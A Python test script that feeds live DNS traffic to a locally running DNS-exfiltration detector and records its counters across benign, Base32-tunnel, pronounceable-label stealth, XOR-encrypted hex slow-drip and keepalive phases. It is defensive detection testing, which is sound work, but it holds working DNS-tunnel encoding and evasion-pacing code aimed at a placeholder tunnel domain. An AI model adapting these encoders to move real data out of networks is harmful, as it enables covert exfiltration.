#!/usr/bin/env python3
"""Live adversarial gauntlet against a RUNNING ExfilTrap engine.

Sends real DNS queries from user space (no root) and measures the engine's
per-phase response via its localhost API. Phases map to the literature:

  P1  everyday benign (false-positive trap; includes scary-looking names)
  P2  loud Base32 tunnel (base-paper regime: expect CONFIRMED + decodes)
  P3  phonotactic stealth (Al Musa '25: pronounceable, per-query benign)
  P4  encrypted hex slow-drip (variable chunks, jittered 6-9s pacing)
  P5  machine-periodic keepalive (negative control for the beacon guard)

Every phase snapshots the engine's counters before/after; the deltas ARE
the verdict. No simulation, no test pipeline — the live engine decides.
"""

from __future__ import annotations

import base64
import json
import random
import socket
import struct
import subprocess
import time
import urllib.request

API = "http://127.0.0.1:5050"
STUB = "127.0.0.53"          # systemd-resolved (loopback session)
TUNNEL = "tunnel.example"

EVERYDAY = ["google.com", "youtube.com", "wikipedia.org", "github.com",
            "cloudflare.com", "netflix.com", "openai.com", "mint.org"]
SCARY = ["ransomware.com", "c2server.com", "botnet-zombie.io",
         "malware-download.net", "darkweb-c2.ru", "keylogger-shop.com"]
PHONETIC = ["bavoke", "taminor", "kelupa", "soravi", "mudane", "revaso",
            "pilo-k", "nuveda", "latomi", "gesura", "vokemi", "dapula"]


def upstream_resolver() -> str:
    """The real LAN/upstream resolver (reached via the wifi uplink)."""
    try:
        out = subprocess.run(["resolvectl", "dns"], capture_output=True,
                             text=True, timeout=5).stdout
        for token in out.split():
            if token.count(".") == 3 and not token.startswith("127."):
                return token
    except Exception:
        pass
    return "1.1.1.1"


def api(path: str):
    with urllib.request.urlopen(API + path, timeout=5) as r:
        return json.load(r)


def snap():
    t = api("/api/stats")["totals"]
    return t["queries"], t["flagged"], t["confirmed"], t["blocked"]


def dns_name_query(sock: socket.socket, server: str, name: str, txid: int):
    qname = b"".join(bytes([len(p)]) + p.encode()
                     for p in name.split(".")) + b"\x00"
    msg = struct.pack(">HHHHHH", txid & 0xFFFF, 0x0100, 1, 0, 0, 0) + qname \
        + b"\x00\x01\x00\x01"
    sock.sendto(msg, (server, 53))


def send_phase(sock, server, names, qps, jitter, rng):
    interval = 1.0 / qps
    for i, name in enumerate(names):
        target_t = time.time() + interval * (1 + rng.uniform(-0.2, 0.2))
        delay = target_t - time.time()
        if delay > 0:
            time.sleep(delay)
        dns_name_query(sock, server, name, i + 1)


def b32_tunnel_qname(payload: bytes) -> str:
    enc = base64.b32encode(payload).decode().rstrip("=")
    chunks = [enc[i:i + 50] for i in range(0, len(enc), 50)]
    return ".".join(chunks) + "." + TUNNEL


def hex_drip_qname(rng, plain: bytes) -> str:
    return plain.hex() + "." + TUNNEL


def main() -> int:
    rng = random.Random(20260906)
    upstream = upstream_resolver()
    print(f"engine API: {API}   upstream resolver: {upstream}   stub: {STUB}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    results: list[dict] = []
    t_mark = 0.0

    def phase(name, expect, fn):
        nonlocal results
        before = snap()
        t0 = time.time()
        fn()
        time.sleep(4)  # let the engine flush + decide
        after = snap()
        d = {
            "phase": name, "expect": expect,
            "new_queries": after[0] - before[0],
            "new_flagged": after[1] - before[1],
            "new_confirmed": after[2] - before[2],
            "seconds": round(time.time() - t0, 1),
        }
        results.append(d)
        print(f"  -> {d}")

    # -------------------------------------------------- P1 benign + scary
    print("[P1] benign everyday + scary-looking names (false-positive trap)")
    def p1():
        names = []
        for i in range(30):
            names.append(rng.choice(EVERYDAY))
        for i in range(12):
            names.append(rng.choice(SCARY))
        rng.shuffle(names)
        send_phase(sock, STUB, names, 2.0, 0.2, rng)
    phase("P1 benign + scary names (stub)", "0 new flagged", p1)

    # -------------------------------------------------- P2 loud Base32 tunnel
    print("[P2] loud Base32 tunnel — plaintext exfil (base-paper regime)")
    def p2():
        names = [b32_tunnel_qname(b"QUARTERLY-RESULTS-XLSX " + bytes([i]) * 2)
                 for i in range(30)]
        send_phase(sock, upstream, names, 6.0, 0.15, rng)
    phase("P2 loud base32 tunnel (uplink)", "flagged + confirmed decodes", p2)

    # -------------------------------------------------- P3 phonotactic stealth
    print("[P3] phonotactic stealth (Al Musa '25): pronounceable labels, "
          "per-query benign, ~7s pacing")
    def p3():
        names = []
        for i in range(20):
            label = "-".join(rng.choice(PHONETIC) for _ in range(2))
            names.append(f"{label}.sync.{rng.choice(EVERYDAY)}")
        send_phase(sock, upstream, names, 0.14, 0.0, rng)  # ~7s apart
    phase("P3 phonotactic stealth (uplink)", "stateful HIGH (mass/beacon)", p3)

    # -------------------------------------------------- P4 encrypted hex drip
    print("[P4] encrypted hex slow-drip: keystream XOR, 4-10B chunks, ~7s")
    def p4():
        names = []
        key = rng.randbytes(16)
        for i in range(20):
            plain = f"chunk-{i}-of-secret-document".encode()
            enc = bytes(b ^ key[i % len(key)] for b in plain)[: rng.randint(4, 10)]
            names.append(hex_drip_qname(rng, enc))
        send_phase(sock, upstream, names, 0.14, 0.0, rng)
    phase("P4 encrypted hex slow-drip (uplink)", "stateful HIGH (mass)", p4)

    # -------------------------------------------------- P5 keepalive negative
    print("[P5] fast periodic keepalive poller (beacon-guard negative control)")
    def p5():
        names = [f"keepalive-{i}.telemetry.internal" for i in range(15)]
        send_phase(sock, STUB, names, 3.0, 0.0, rng)   # 0.33s period, < 5s
    phase("P5 fast keepalive poller (stub)", "0 new flagged (interval < 5s guard)", p5)

    sock.close()

    print("\n=== per-phase verdicts ===")
    for d in results:
        print(f"{d['phase']:44s} +{d['new_queries']:4d} q   "
              f"flagged +{d['new_flagged']:3d}   confirmed +{d['new_confirmed']:3d}   "
              f"({d['seconds']}s)   expect: {d['expect']}")

    total_flagged = sum(d["new_flagged"] for d in results)
    print(f"\nTOTAL flagged this gauntlet: {total_flagged}")

    # evidence: latest risk events + live sessions
    try:
        ev = api("/api/events?limit=6")["events"]
        print("\nlatest risk events:")
        for e in ev:
            print(f"  {e['risk_level']:9s} {e['src_ip']:15s} {e['qname'][:48]:48s} {e['reasons'][:60]}")
        ss = api("/api/sessions").get("sessions", [])
        if ss:
            print("\nlive sessions:")
            for s in ss[:6]:
                print(f"  {s['src_ip']:15s} q={s['query_count']:4d} mean_mass={s['mean_mass']:6.2f} "
                      f"cv={s['interval_cv']} drip={s['slow_drip']} beacon={s['beacon']}")
    except Exception as exc:
        print("(api evidence unavailable:", exc, ")")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
